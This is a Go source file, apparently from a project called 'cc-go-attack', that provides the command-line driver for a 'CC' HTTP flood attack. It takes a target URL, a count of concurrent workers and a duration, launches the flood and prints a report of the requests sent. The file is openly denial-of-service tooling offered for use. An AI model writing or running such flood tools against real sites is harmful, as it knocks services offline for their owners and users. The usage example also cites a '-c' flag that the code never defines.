package ccgo

import (
	"cc-go-attack/src"
	"errors"
	"fmt"
	"github.com/fatih/color"
	"github.com/spf13/cobra"
	"os"
	"strconv"
)

var (
	workers  	string
	times    	string
	ccGoCmd = &cobra.Command{
		Use:          "cc-go",
		Short:        "cc-go for simple cc attack",
		Example:      "cc-go -w 100 -c 20 http://www.******.com/cc?id=1",
		SilenceUsage: true,
		Args: func(cmd *cobra.Command, args []string) error {
			if len(args) < 1 {
				return errors.New("requires target url arg (http://xxxxx.com)")
			}
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			return do(args)
		},
	}
)

func init() {
	ccGoCmd.PersistentFlags().StringVarP(&workers, "worker", "w", "100", "The number of worker threads executing concurrently")
	ccGoCmd.PersistentFlags().StringVarP(&times, "time", "t", "10", "How long(s)")
}

func do(args []string) error {
	cc := new(src.CC)

	cc.Url = args[0]
	num, _ := strconv.Atoi(workers)
	cc.Worker = num

	t, _ := strconv.Atoi(times)
	cc.Time = t

	err := cc.New()
	if err != nil {
		return err
	}

	cc.Start()
	//cc.Scheduler.Done()

	printReport(cc)
	return nil
}

func Exec() {
	if err := ccGoCmd.Execute(); err != nil {
		os.Exit(0)
	}
}

func printReport(cc *src.CC)  {
	fmt.Println()
	fmt.Println()
	color.Cyan("|------------------------------------------------------------------|")
	color.Cyan("| attack url: "+ cc.Url)
	color.Cyan("|------------------------------------------------------------------|")
	color.Cyan("| total times: "+ times)
	color.Cyan("|------------------------------------------------------------------|")
	color.Cyan("| concurrent workers: "+ workers)
	color.Cyan("|------------------------------------------------------------------|")
	color.Cyan("| total requests: "+strconv.FormatInt(int64(cc.Report.Request), 10))
	color.Cyan("|------------------------------------------------------------------|")
}